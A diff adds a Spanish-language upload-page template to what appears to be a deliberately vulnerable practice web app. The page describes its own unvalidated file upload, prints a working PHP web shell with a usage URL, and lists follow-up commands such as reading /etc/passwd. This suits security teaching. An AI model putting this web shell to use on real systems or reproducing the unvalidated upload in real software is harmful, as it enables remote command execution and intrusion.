@@ -1,0 +1,150 @@
+{% extends "base.html" %}
+
+{% block title %}Subir Archivos - Ferreterías Juan{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <h1><i class="fas fa-upload text-primary me-2"></i>Subir Archivos</h1>
+        <p class="lead">Sube imágenes de productos, documentos y archivos del sistema</p>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-md-6">
+        <!-- Formulario de subida -->
+        <div class="card">
+            <div class="card-header">
+                <h5><i class="fas fa-cloud-upload-alt me-2"></i>Subir Archivo</h5>
+            </div>
+            <div class="card-body">
+                <form method="POST" enctype="multipart/form-data">
+                    <div class="mb-3">
+                        <label for="file" class="form-label">Seleccionar archivo</label>
+                        <input type="file" class="form-control" id="file" name="file" required>
+                        <div class="form-text">
+                            Tamaño máximo: 16MB
+                        </div>
+                    </div>
+                    <button type="submit" class="btn btn-primary">
+                        <i class="fas fa-upload me-1"></i>Subir Archivo
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Vulnerabilidad Info -->
+        <div class="card mt-3">
+            <div class="card-header bg-danger text-white">
+                <h6 class="mb-0"><i class="fas fa-exclamation-triangle me-2"></i>VULNERABILIDAD: File Upload</h6>
+            </div>
+            <div class="card-body">
+                <p><strong>Esta sección permite subir cualquier tipo de archivo sin validación.</strong></p>
+                <div class="alert alert-warning mb-3">
+                    <h6>Tipos de archivos peligrosos para probar:</h6>
+                    <ul class="mb-0">
+                        <li><strong>Web Shells:</strong> <code>shell.php</code>, <code>cmd.py</code></li>
+                        <li><strong>Doble extensión:</strong> <code>imagen.jpg.php</code></li>
+                        <li><strong>Scripts maliciosos:</strong> <code>backdoor.php</code></li>
+                        <li><strong>Ejecutables:</strong> <code>malware.exe</code></li>
+                    </ul>
+                </div>
+
+                <h6>Ejemplo de Web Shell (shell.php):</h6>
+                <pre class="bg-dark text-light p-2 rounded small"><code>&lt;?php
+if(isset($_GET['cmd'])) {
+    echo "&lt;pre&gt;";
+    system($_GET['cmd']);
+    echo "&lt;/pre&gt;";
+}
+?&gt;</code></pre>
+                <p class="small text-muted">Uso: <code>http://localhost/static/uploads/shell.php?cmd=whoami</code></p>
+            </div>
+        </div>
+    </div>
+
+    <div class="col-md-6">
+        <!-- Archivos subidos -->
+        <div class="card">
+            <div class="card-header">
+                <h5><i class="fas fa-folder-open me-2"></i>Archivos Subidos</h5>
+            </div>
+            <div class="card-body">
+                {% if files %}
+                    <div style="max-height: 400px; overflow-y: auto;">
+                        {% for file in files %}
+                        <div class="d-flex justify-content-between align-items-center py-2 border-bottom">
+                            <div>
+                                <i class="fas fa-file me-2"></i>
+                                <a href="{{ url_for('static', filename='uploads/' + file) }}" target="_blank">
+                                    {{ file }}
+                                </a>
+                            </div>
+                            <div>
+                                {% if file.endswith('.php') %}
+                                    <span class="badge bg-danger">PHP</span>
+                                {% elif file.endswith('.py') %}
+                                    <span class="badge bg-warning">Python</span>
+                                {% elif file.endswith('.js') %}
+                                    <span class="badge bg-info">JavaScript</span>
+                                {% elif file.endswith(('.jpg', '.jpeg', '.png', '.gif')) %}
+                                    <span class="badge bg-success">Imagen</span>
+                                {% else %}
+                                    <span class="badge bg-secondary">Otro</span>
+                                {% endif %}
+                            </div>
+                        </div>
+                        {% endfor %}
+                    </div>
+                {% else %}
+                    <div class="text-center text-muted">
+                        <i class="fas fa-folder-open fa-3x mb-3"></i>
+                        <p>No hay archivos subidos</p>
+                    </div>
+                {% endif %}
+            </div>
+        </div>
+
+        <!-- Comandos útiles para shells -->
+        <div class="card mt-3">
+            <div class="card-header">
+                <h6><i class="fas fa-terminal me-2"></i>Comandos Útiles para Web Shell</h6>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-6">
+                        <strong>Reconocimiento:</strong>
+                        <ul class="small">
+                            <li><code>whoami</code></li>
+                            <li><code>pwd</code></li>
+                            <li><code>ls -la</code></li>
+                            <li><code>id</code></li>
+                        </ul>
+                    </div>
+                    <div class="col-6">
+                        <strong>Sistema:</strong>
+                        <ul class="small">
+                            <li><code>cat /etc/passwd</code></li>
+                            <li><code>ps aux</code></li>
+                            <li><code>netstat -tulpn</code></li>
+                            <li><code>uname -a</code></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Script para mostrar preview de archivos -->
+<script>
+document.getElementById('file').addEventListener('change', function(e) {
+    const file = e.target.files[0];
+    if (file) {
+        const fileName = file.name;
+        const fileSize = (file.size / 1024 / 1024).toFixed(2);
+        console.log(`Archivo seleccionado: ${fileName} (${fileSize} MB)`);
+    }
+});
+</script>
+{% endblock %}
